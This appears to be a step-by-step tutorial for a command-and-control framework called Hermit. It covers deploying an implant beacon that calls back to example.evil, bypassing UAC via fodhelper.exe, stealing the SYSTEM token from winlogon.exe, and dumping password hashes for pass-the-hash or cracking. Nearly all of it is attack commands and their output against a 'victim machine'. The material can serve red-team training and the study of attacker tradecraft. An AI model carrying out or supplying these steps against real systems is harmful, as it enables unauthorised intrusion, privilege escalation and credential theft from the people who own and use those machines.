# Privilege Escalation with Implant Beacon

In this tutorial, we're going to  escalate privilege to **System** user with implant beacon on Windows victim machine.  

Assume that you've already done [the Tutorial: Simple Implant Beacon](./simple-implant-beacon.md).  

## 1. Start Implant & Activate Agent Mode

Because we've already learned the basic operation for an implant in the previous tutorial, we proceed as follows without detailed explanations:

```sh title="Hermit C2 Server Console"
# 1. Start Hermit server.
./hermit

# 2. Start listener.
Hermit > listener new

# 3. Generate an implant (beacon, windows/amd64/exe).
Hermit > payload gen

# 4. Transfer the implant to Windows victim machine and execute it as normal user (not administrator or system user).

# Wait until the agent callbacks...

# 5. Activate the Agent Mode.
Hermit > agent use 1
Hermit [agent-stephan] >
```

Now we can send tasks to the agent and get result callbacks.

## 2. Check the Current Privileges

Because we want to compare the privileges before/after, check the current privileges with the following command at first:

```sh title="Hermit C2 Server Console"
Hermit [agent-stephan] > whoami --priv
```

This command prints the current privileges.  
After a few seconds, see the result:

```sh title="Hermit C2 Server Console"
Hermit [agent-stephan] > task results

2024-05-13 09:53:55 : whoami priv
=================================
x SeShutdownPrivilege
o SeChangeNotifyPrivilege
x SeUndockPrivilege
x SeIncreaseWorkingSetPrivilege
x SeTimeZonePrivilege
```

In most cases we should get the result similar to the above.  
However, these privielges are not enough for highly sensitive operations, so we want more higher authority.  

Now escalate privilege.

## 3. UAC Bypass

**Hermit** has useful command (task) to bypass UAC, so we're going to use the method.  
Run the `uac` task on the C2 server console:

```sh title="Hermit C2 Server Console"
Hermit [agent-stephan] > uac
Technique: fodhelper
```

This task bypasses **UAC** by abusing `fodhelper.exe` and start another **implant** process.  
Wait until the task result will be callback, then check the result:

```sh title="Hermit C2 Server Console"
Hermit [agent-stephan] > task results

2024-05-13 09:54:05 : uac --technique fodhelper
===============================================
Success: The fodhelper.exe and another process started successfully.
```

Okay, now the implant **'escalated'** process has started.  
Exit the current agent mode and check another agent session (wait a few seconds until calback again):

```sh title="Hermit C2 Server Console"
Hermit [agent-stephan] > exit
Hermit > agents
[+]
ID  Name             IP           OS/Arch        Hostname         ListenerURL                 ImplantType  CheckIn              SessionID
1   agent-stephan    172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:53:17  Imh2EvmDAJOglBMJZjBddB1Dib5UyJt2
2   agent-elizabeth  172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:54:12  HHqvfKw8I5Lu4bzmH6MFknjKO7YFV3lG
```

We should see another agent listed as above. Switch to this newly agent mode:

```sh title="Hermit C2 Server Console"
Hermit > agent use 2
Hermit [agent-elizabeth] >
```

Now check the privilege:

```sh title="Hermit C2 Server Console"
Hermit [agent-elizabeth] > whoami --priv

# Wait until the result will be callback...

Hermit [agent-elizabeth] > task results

2024-05-13 09:54:41 : whoami priv
=================================
x SeIncreaseQuotaPrivilege
x SeSecurityPrivilege
x SeTakeOwnershipPrivilege
x SeLoadDriverPrivilege
x SeSystemProfilePrivilege
x SeSystemtimePrivilege
x SeProfileSingleProcessPrivilege
x SeIncreaseBasePriorityPrivilege
x SeCreatePagefilePrivilege
x SeBackupPrivilege
x SeRestorePrivilege
x SeShutdownPrivilege
x SeDebugPrivilege
x SeSystemEnvironmentPrivilege
o SeChangeNotifyPrivilege
x SeRemoteShutdownPrivilege
x SeUndockPrivilege
x SeManageVolumePrivilege
o SeImpersonatePrivilege
o SeCreateGlobalPrivilege
x SeIncreaseWorkingSetPrivilege
x SeTimeZonePrivilege
x SeCreateSymbolicLinkPrivilege
x SeDelegateSessionUserImpersonatePrivilege
```

You can see that the privileges have changed from the ones we initially checked.  
Sicne we have **SeImpersonatePrivilege**, we can abuse it for privilege escalation with Token Manipulation!

## 4. Token Stealing

We're going to steal token and retrive the **SYSTEM** user account.  
Firstly, enumerate running proccesses and find a process which is available to our purpose so run the following command:

```sh title="Hermit C2 Server Console"
Hermit [agent-elizabeth] > ps ls

# Wait until the result callback...

Hermit [agent-elizabeth] > task results

2024-05-13 10:13:23 : ps ls --exclude  --filter
================================================
 PID    Name
 ---    ----
 0
 4      System
 72     Registry
 532    smss.exe
 640    csrss.exe
 736    wininit.exe
 744    csrss.exe
 792    winlogon.exe
 ...
```

In the result, we can use the `winlogon.exe` process (PID: 792).  
Then try stealing using this PID:

```sh title="Hermit C2 Server Console"
# -p 792: Set the target PID 792.
Hermit [agent-elizabeth] > token steal -p 792

# Wait until the result will be callback...

Hermit [agent-elizabeth] > task results

2024-05-13 10:14:32 : token steal --pid 792
===============================================================================
Success: Token has been stolen successfully.
```

If this task is succussful, another implant process will start again.  
Exit the current agent mode and see another agent session:

```sh title="Hermit C2 Server Console"
Hermit [agent-elizabeth] > exit
Hermit > agents

[+]
ID  Name             IP           OS/Arch        Hostname         ListenerURL                 ImplantType  CheckIn              SessionID
1   agent-stephan    172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:53:17  Imh2EvmDAJOglBMJZjBddB1Dib5UyJt2
2   agent-elizabeth  172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:54:12  HHqvfKw8I5Lu4bzmH6MFknjKO7YFV3lG
3   agent-thomas     172.20.32.1  windows/amd64  VICTIM-MACHINE   https://example.evil:56692  beacon       2024-05-13 09:55:24  xe8dBGZkkQ1TZkcxJa3EC4U5SqOE0EfC
```

Now switch to the newly agent (**ID: 3** here) with the following command:

```sh title="Hermit C2 Server Console"
Hermit > agent use 3
Hermit [agent-thomas] >
```

Check current username and privileges with the following commands:

```sh title="Hermit C2 Server Console"
Hermit [agent-thomas] > whoami
Hermit [agent-thomas] > whoami --priv
```

We should see that we're currently the **SYSTEM** user and have many privileges enabled as follow:

```sh title="Hermit C2 Server Console"
Hermit [agent-thomas] > task results

2024-05-13 10:14:40 : whoami
============================
VICTIM-MACHINE\SYSTEM

2024-05-13 10:14:51 : whoami priv
=================================
x SeAssignPrimaryTokenPrivilege
x SeIncreaseQuotaPrivilege
o SeTcbPrivilege
x SeSecurityPrivilege
x SeTakeOwnershipPrivilege
x SeLoadDriverPrivilege
o SeProfileSingleProcessPrivilege
o SeIncreaseBasePriorityPrivilege
o SeCreatePermanentPrivilege
x SeBackupPrivilege
x SeRestorePrivilege
x SeShutdownPrivilege
o SeDebugPrivilege
o SeAuditPrivilege
x SeSystemEnvironmentPrivilege
o SeChangeNotifyPrivilege
x SeUndockPrivilege
x SeManageVolumePrivilege
o SeImpersonatePrivilege
o SeCreateGlobalPrivilege
x SeTrustedCredManAccessPrivilege
```

## 5. Exfiltration (Credential Dumping)

Now nothing is impossible for us because we're currently the **SYSTEM** user!  
So let's dump the credentials.  

We use the `hashdump` task to dump hash passwords from registry hives.  
To do so simply run the following command:

```sh title="Hermit C2 Server Console"
Hermit [agent-thomas] > hashdump
```

After a few seconds, get the result:

```sh title="Hermit C2 Server Console"
Hermit [agent-thomas] > task results

2024-05-13 10:15:48 : hashdump
==============================
Administrator:500:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
Guest:501:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
DefaultAccount:503:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
WDAGUtilityAccount:504:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::
Victim:1001:abcdef0123456789abcdef0123456789:abcdef0123456789abcdef0123456789:::

dpapi_machinekey:0x0123456789abcdef0123456789abcdef01234567
dpapi_userkey:0x0123456789abcdef0123456789abcdef01234567
```

We can use these hash passwords for **Pass the Hash** attack or we can crack them.  
